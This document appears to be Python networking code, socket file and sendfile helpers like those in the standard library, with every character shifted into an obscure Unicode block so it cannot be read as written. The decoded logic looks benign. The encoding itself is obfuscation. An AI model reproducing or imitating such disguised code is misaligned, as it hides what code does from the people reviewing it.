ꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꜀꛱꛱꛰꛽ꚫꛈꚫ꛴꛺ꚹꛍ꜀꛱꛱꛰꛽꛰ꛯꛢ꛽꛴꛿꛰꛽ꚳ꛽ꛬ꜂ꚷꚫꛭ꜀꛱꛱꛰꛽꛴꛹꛲ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛭ꛴꛹ꛬ꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛭ꜀꛱꛱꛰꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛹ꛮ꛺ꛯ꛴꛹꛲ꚫꛈꚫ꛴꛺ꚹ꛿꛰꜃꛿ꛪ꛰꛹ꛮ꛺ꛯ꛴꛹꛲ꚳ꛰꛹ꛮ꛺ꛯ꛴꛹꛲ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛰꜃꛿ꚫꛈꚫ꛴꛺ꚹꛟ꛰꜃꛿ꛔꛚꛢ꛽ꛬ꛻꛻꛰꛽ꚳꛭ꜀꛱꛱꛰꛽ꚷꚫ꛰꛹ꛮ꛺ꛯ꛴꛹꛲ꚷꚫ꛰꛽꛽꛺꛽꛾ꚷꚫ꛹꛰꜂꛷꛴꛹꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛰꜃꛿ꚹ꛸꛺ꛯ꛰ꚫꛈꚫ꛸꛺ꛯ꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛿꛰꜃꛿ꚕꚕꚫꚫꚫꚫ꛴꛱ꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳ꛺꛾ꚷꚫꚲ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚲꚴꛅꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫꛪ꛾꛰꛹ꛯ꛱꛴꛷꛰ꛪ꜀꛾꛰ꛪ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚳ꛾꛰꛷꛱ꚷꚫ꛱꛴꛷꛰ꚷꚫ꛺꛱꛱꛾꛰꛿ꛈꚻꚷꚫꛮ꛺꜀꛹꛿ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛪ꛾꛰꛹ꛯ꛱꛴꛷꛰ꛪ꛻ꛬ꛽ꛬ꛸꛾ꚳ꛱꛴꛷꛰ꚷꚫ꛺꛱꛱꛾꛰꛿ꚷꚫꛮ꛺꜀꛹꛿ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶꛹꛺ꚫꛈꚫ꛾꛰꛷꛱ꚹ꛱꛴꛷꛰꛹꛺ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛴꛷꛰꛹꛺ꚫꛈꚫ꛱꛴꛷꛰ꚹ꛱꛴꛷꛰꛹꛺ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꚳꛌ꛿꛿꛽꛴ꛭ꜀꛿꛰ꛐ꛽꛽꛺꛽ꚷꚫ꛴꛺ꚹꛠ꛹꛾꜀꛻꛻꛺꛽꛿꛰ꛯꛚ꛻꛰꛽ꛬ꛿꛴꛺꛹ꚴꚫꛬ꛾ꚫ꛰꛽꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛪꛒ꛴꜁꛰꜀꛻ꛚ꛹ꛞ꛰꛹ꛯ꛱꛴꛷꛰ꚳ꛰꛽꛽ꚴꚫꚫꚮꚫ꛹꛺꛿ꚫꛬꚫ꛽꛰꛲꜀꛷ꛬ꛽ꚫ꛱꛴꛷꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛾꛴꜅꛰ꚫꛈꚫ꛺꛾ꚹ꛱꛾꛿ꛬ꛿ꚳ꛱꛴꛷꛰꛹꛺ꚴꚹ꛾꛿ꛪ꛾꛴꜅꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛚꛞꛐ꛽꛽꛺꛽ꚫꛬ꛾ꚫ꛰꛽꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛪꛒ꛴꜁꛰꜀꛻ꛚ꛹ꛞ꛰꛹ꛯ꛱꛴꛷꛰ꚳ꛰꛽꛽ꚴꚫꚫꚮꚫ꛹꛺꛿ꚫꛬꚫ꛽꛰꛲꜀꛷ꛬ꛽ꚫ꛱꛴꛷꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛱꛾꛴꜅꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꚻꚫꚫꚮꚫ꛰꛸꛻꛿꜄ꚫ꛱꛴꛷꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛟ꛽꜀꛹ꛮꛬ꛿꛰ꚫ꛿꛺ꚫꚼꛒ꛴ꛍꚫ꛿꛺ꚫꛬ꜁꛺꛴ꛯꚫꛚ꜁꛰꛽꛱꛷꛺꜂ꛐ꛽꛽꛺꛽ꚷꚫ꛾꛰꛰ꚫꛭ꛻꛺ꚸꚾꛃꚾꚼꛄꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꛷꛺ꛮ꛶꛾꛴꜅꛰ꚫꛈꚫ꛸꛴꛹ꚳꛮ꛺꜀꛹꛿ꚫ꛺꛽ꚫ꛱꛾꛴꜅꛰ꚷꚫꚽꚫꚵꚵꚫꚾꚻꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛴꛸꛰꛺꜀꛿ꚫꛈꚫ꛾꛰꛷꛱ꚹ꛲꛰꛿꛿꛴꛸꛰꛺꜀꛿ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛿꛴꛸꛰꛺꜀꛿ꚫꛈꛈꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛹꛺꛹ꚸꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚫ꛾꛺ꛮ꛶꛰꛿꛾ꚫꛬ꛽꛰ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛻꛺꛷꛷ꚺ꛾꛰꛷꛰ꛮ꛿ꚫ꛳ꛬ꜁꛰ꚫ꛿꛳꛰ꚫꛬꛯ꜁ꛬ꛹꛿ꛬ꛲꛰ꚫ꛺꛱ꚫ꛹꛺꛿ꚫ꛽꛰꛼꜀꛴꛽꛴꛹꛲ꚫꛬ꛹꜄ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛰꜃꛿꛽ꛬꚫ꛱꛴꛷꛰ꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛺꛽ꚷꚫꛮ꛺꛹꛿꛽ꛬ꛽꛴꛷꜄ꚫ꛿꛺ꚫ꛰꛻꛺꛷꛷ꚺ꛶꛼꜀꛰꜀꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꚳꛬ꛷꛾꛺ꚷꚫ꛿꛳꛰꜄ꚫ꛽꛰꛼꜀꛴꛽꛰ꚫꛬꚫ꛾꛴꛹꛲꛷꛰ꚫ꛾꜄꛾ꛮꛬ꛷꛷ꚴꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳ꛾꛰꛷꛰ꛮ꛿꛺꛽꛾ꚷꚫꚲꛛ꛺꛷꛷ꛞ꛰꛷꛰ꛮ꛿꛺꛽ꚲꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛰ꛮ꛿꛺꛽ꚫꛈꚫ꛾꛰꛷꛰ꛮ꛿꛺꛽꛾ꚹꛛ꛺꛷꛷ꛞ꛰꛷꛰ꛮ꛿꛺꛽ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛰ꛮ꛿꛺꛽ꚫꛈꚫ꛾꛰꛷꛰ꛮ꛿꛺꛽꛾ꚹꛞ꛰꛷꛰ꛮ꛿ꛞ꛰꛷꛰ꛮ꛿꛺꛽ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛰ꛮ꛿꛺꛽ꚹ꛽꛰꛲꛴꛾꛿꛰꛽ꚳ꛾꛺ꛮ꛶꛹꛺ꚷꚫ꛾꛰꛷꛰ꛮ꛿꛺꛽꛾ꚹꛐꛡꛐꛙꛟꛪꛢꛝꛔꛟꛐꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛺꛿ꛬ꛷ꛪ꛾꛰꛹꛿ꚫꛈꚫꚻꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛷꛺ꛮꛬ꛷꛴꜅꛰ꚫ꜁ꛬ꛽꛴ꛬꛭ꛷꛰ꚫꛬꛮꛮ꛰꛾꛾ꚫ꛿꛺ꚫ꛸꛴꛹꛴꛸꛴꜅꛰ꚫ꛺꜁꛰꛽꛳꛰ꛬꛯꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛰ꛮ꛿꛺꛽ꛪ꛾꛰꛷꛰ꛮ꛿ꚫꛈꚫ꛾꛰꛷꛰ꛮ꛿꛺꛽ꚹ꛾꛰꛷꛰ꛮ꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛺꛾ꛪ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚫꛈꚫ꛺꛾ꚹ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꜂꛳꛴꛷꛰ꚫꛟ꛽꜀꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛿꛴꛸꛰꛺꜀꛿ꚫꛬ꛹ꛯꚫ꛹꛺꛿ꚫ꛾꛰꛷꛰ꛮ꛿꛺꛽ꛪ꛾꛰꛷꛰ꛮ꛿ꚳ꛿꛴꛸꛰꛺꜀꛿ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛟ꛴꛸꛰꛺꜀꛿ꛐ꛽꛽꛺꛽ꚳꚲ꛿꛴꛸꛰ꛯꚫ꛺꜀꛿ꚲꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛮ꛺꜀꛹꛿ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꛷꛺ꛮ꛶꛾꛴꜅꛰ꚫꛈꚫꛮ꛺꜀꛹꛿ꚫꚸꚫ꛿꛺꛿ꛬ꛷ꛪ꛾꛰꛹꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛭ꛷꛺ꛮ꛶꛾꛴꜅꛰ꚫꛇꛈꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꛽꛰ꛬ꛶ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛹꛿ꚫꛈꚫ꛺꛾ꛪ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚳ꛾꛺ꛮ꛶꛹꛺ꚷꚫ꛱꛴꛷꛰꛹꛺ꚷꚫ꛺꛱꛱꛾꛰꛿ꚷꚫꛭ꛷꛺ꛮ꛶꛾꛴꜅꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛍ꛷꛺ꛮ꛶꛴꛹꛲ꛔꛚꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛿꛴꛸꛰꛺꜀꛿ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛍ꛷꛺ꛮ꛶ꚫ꜀꛹꛿꛴꛷ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛴꛾ꚫ꛽꛰ꛬꛯ꜄ꚫ꛿꛺ꚫ꛾꛰꛹ꛯꚫ꛾꛺꛸꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛯꛬ꛿ꛬꛆꚫꛬ꜁꛺꛴ꛯ꛾ꚫ꛳꛺꛲꛲꛴꛹꛲ꚫꛎꛛꛠꚫ꛽꛰꛾꛺꜀꛽ꛮ꛰꛾ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛰ꛮ꛿꛺꛽ꛪ꛾꛰꛷꛰ꛮ꛿ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛴꛹꜀꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛚꛞꛐ꛽꛽꛺꛽ꚫꛬ꛾ꚫ꛰꛽꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛿꛺꛿ꛬ꛷ꛪ꛾꛰꛹꛿ꚫꛈꛈꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛢ꛰ꚫꛮꛬ꛹ꚫ꛲꛰꛿ꚫ꛳꛰꛽꛰ꚫ꛱꛺꛽ꚫꛯ꛴꛱꛱꛰꛽꛰꛹꛿ꚫ꛽꛰ꛬ꛾꛺꛹꛾ꚷꚫ꛿꛳꛰ꚫ꛸ꛬ꛴꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛺꛹꛰ꚫꛭ꛰꛴꛹꛲ꚫꚲ꛱꛴꛷꛰ꚲꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛬꚫ꛽꛰꛲꜀꛷ꛬ꛽ꚫ꛸꛸ꛬ꛻ꚳꚽꚴꚸ꛷꛴꛶꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛱꛴꛷꛰ꚷꚫ꛴꛹ꚫ꜂꛳꛴ꛮ꛳ꚫꛮꛬ꛾꛰ꚫ꜂꛰ꚲ꛷꛷ꚫ꛱ꛬ꛷꛷ꚫꛭꛬꛮ꛶ꚫ꛺꛹ꚫ꜀꛾꛴꛹꛲ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛻꛷ꛬ꛴꛹ꚫ꛾꛰꛹ꛯꚳꚴꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛪꛒ꛴꜁꛰꜀꛻ꛚ꛹ꛞ꛰꛹ꛯ꛱꛴꛷꛰ꚳ꛰꛽꛽ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫ꛰꛽꛽ꚫ꛱꛽꛺꛸ꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛹꛿ꚫꛈꛈꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꛽꛰ꛬ꛶ꚫꚫꚮꚫꛐꛚꛑꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛺꛱꛱꛾꛰꛿ꚫꚶꛈꚫ꛾꛰꛹꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛺꛿ꛬ꛷ꛪ꛾꛰꛹꛿ꚫꚶꛈꚫ꛾꛰꛹꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛿꛺꛿ꛬ꛷ꛪ꛾꛰꛹꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛴꛹ꛬ꛷꛷꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛿꛺꛿ꛬ꛷ꛪ꛾꛰꛹꛿ꚫꛉꚫꚻꚫꛬ꛹ꛯꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳ꛱꛴꛷꛰ꚷꚫꚲ꛾꛰꛰꛶ꚲꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛴꛷꛰ꚹ꛾꛰꛰꛶ꚳ꛺꛱꛱꛾꛰꛿ꚴꚕꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫꛪ꛾꛰꛹ꛯ꛱꛴꛷꛰ꛪ꜀꛾꛰ꛪ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚳ꛾꛰꛷꛱ꚷꚫ꛱꛴꛷꛰ꚷꚫ꛺꛱꛱꛾꛰꛿ꛈꚻꚷꚫꛮ꛺꜀꛹꛿ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛪꛒ꛴꜁꛰꜀꛻ꛚ꛹ꛞ꛰꛹ꛯ꛱꛴꛷꛰ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛺꛾ꚹ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚳꚴꚫ꛹꛺꛿ꚫꛬ꜁ꛬ꛴꛷ꛬꛭ꛷꛰ꚫ꛺꛹ꚫ꛿꛳꛴꛾ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸ꚭꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪ꛾꛰꛹ꛯ꛱꛴꛷꛰ꛪ꜀꛾꛰ꛪ꛾꛰꛹ꛯꚳ꛾꛰꛷꛱ꚷꚫ꛱꛴꛷꛰ꚷꚫ꛺꛱꛱꛾꛰꛿ꛈꚻꚷꚫꛮ꛺꜀꛹꛿ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛪ꛾꛰꛹ꛯ꛱꛴꛷꛰ꛪ꛻ꛬ꛽ꛬ꛸꛾ꚳ꛱꛴꛷꛰ꚷꚫ꛺꛱꛱꛾꛰꛿ꚷꚫꛮ꛺꜀꛹꛿ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹ꛲꛰꛿꛿꛴꛸꛰꛺꜀꛿ꚳꚴꚫꛈꛈꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛹꛺꛹ꚸꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚫ꛾꛺ꛮ꛶꛰꛿꛾ꚫꛬ꛽꛰ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛺꛱꛱꛾꛰꛿ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛴꛷꛰ꚹ꛾꛰꛰꛶ꚳ꛺꛱꛱꛾꛰꛿ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꛭ꛷꛺ꛮ꛶꛾꛴꜅꛰ꚫꛈꚫ꛸꛴꛹ꚳꛮ꛺꜀꛹꛿ꚷꚫꛃꚼꛄꚽꚴꚫ꛴꛱ꚫꛮ꛺꜀꛹꛿ꚫ꛰꛷꛾꛰ꚫꛃꚼꛄꚽꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛺꛿ꛬ꛷ꛪ꛾꛰꛹꛿ꚫꛈꚫꚻꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛷꛺ꛮꛬ꛷꛴꜅꛰ꚫ꜁ꛬ꛽꛴ꛬꛭ꛷꛰ꚫꛬꛮꛮ꛰꛾꛾ꚫ꛿꛺ꚫ꛸꛴꛹꛴꛸꛴꜅꛰ꚫ꛺꜁꛰꛽꛳꛰ꛬꛯꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛴꛷꛰ꛪ꛽꛰ꛬꛯꚫꛈꚫ꛱꛴꛷꛰ꚹ꛽꛰ꛬꛯꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꛪ꛾꛰꛹ꛯꚫꛈꚫ꛾꛰꛷꛱ꚹ꛾꛰꛹ꛯꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꜂꛳꛴꛷꛰ꚫꛟ꛽꜀꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛮ꛺꜀꛹꛿ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꛷꛺ꛮ꛶꛾꛴꜅꛰ꚫꛈꚫ꛸꛴꛹ꚳꛮ꛺꜀꛹꛿ꚫꚸꚫ꛿꛺꛿ꛬ꛷ꛪ꛾꛰꛹꛿ꚷꚫꛭ꛷꛺ꛮ꛶꛾꛴꜅꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛭ꛷꛺ꛮ꛶꛾꛴꜅꛰ꚫꛇꛈꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꛽꛰ꛬ꛶ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛯꛬ꛿ꛬꚫꛈꚫ꛸꛰꛸꛺꛽꜄꜁꛴꛰꜂ꚳ꛱꛴꛷꛰ꛪ꛽꛰ꛬꛯꚳꛭ꛷꛺ꛮ꛶꛾꛴꜅꛰ꚴꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫꛯꛬ꛿ꛬꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꛽꛰ꛬ꛶ꚫꚫꚮꚫꛐꛚꛑꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꜂꛳꛴꛷꛰ꚫꛟ꛽꜀꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛹꛿ꚫꛈꚫ꛾꛺ꛮ꛶ꛪ꛾꛰꛹ꛯꚳꛯꛬ꛿ꛬꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛍ꛷꛺ꛮ꛶꛴꛹꛲ꛔꛚꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛴꛹꜀꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛺꛿ꛬ꛷ꛪ꛾꛰꛹꛿ꚫꚶꛈꚫ꛾꛰꛹꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛹꛿ꚫꛇꚫ꛷꛰꛹ꚳꛯꛬ꛿ꛬꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛯꛬ꛿ꛬꚫꛈꚫꛯꛬ꛿ꛬꛦ꛾꛰꛹꛿ꛅꛨꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ